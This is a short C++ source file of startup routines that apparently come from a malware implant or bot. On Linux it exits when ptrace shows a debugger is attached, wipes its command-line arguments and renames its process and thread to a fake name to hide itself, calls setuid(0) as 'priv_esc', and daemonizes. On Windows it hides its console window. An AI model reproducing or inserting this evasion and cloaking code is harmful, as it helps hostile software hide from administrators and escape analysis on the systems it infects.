#include "startup.h"

void startup::detect_debugging(void) {
	#ifdef __linux__
		if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) { // anti-debugging
			exit(0);
		}
	#elif _WIN32
		// windows code goes here
	#else
	#endif
}

void startup::misc_os(void) {
	#ifdef __linux__
		signal(SIGPIPE, SIG_IGN);
		signal(SIGCHLD, SIG_IGN); // fuck zombie process's
	#elif _WIN32
		// windows code goes here
	#else
	#endif
}

void startup::cloak_name(int argc, char* argv[], const char *fake_name) {
	//strcpy(argv[0], FAKE_NAME);
	#ifdef __linux__
		for (int i = 0; i < argc; i++) {
			memset(argv[i], '\x0', strlen(argv[i])); // we need to remove the sys args
		}
		strcpy(argv[0], fake_name); // cloak, command name
		prctl(PR_SET_NAME, fake_name); // cloak, thread name
	#elif _WIN32
		// windows code goes here
	#else
	#endif
}

void startup::priv_esc(void) {
	#ifdef __linux__
		setuid(0);
		setreuid(0, 0);
	#elif _WIN32
		// windows code goes here
	#else
	#endif
}

void startup::daemonize(void) {
	#ifdef __linux__
		daemon(true, false);
	#elif _WIN32
		ShowWindow(GetConsoleWindow(), SW_HIDE);
	#else
	#endif
}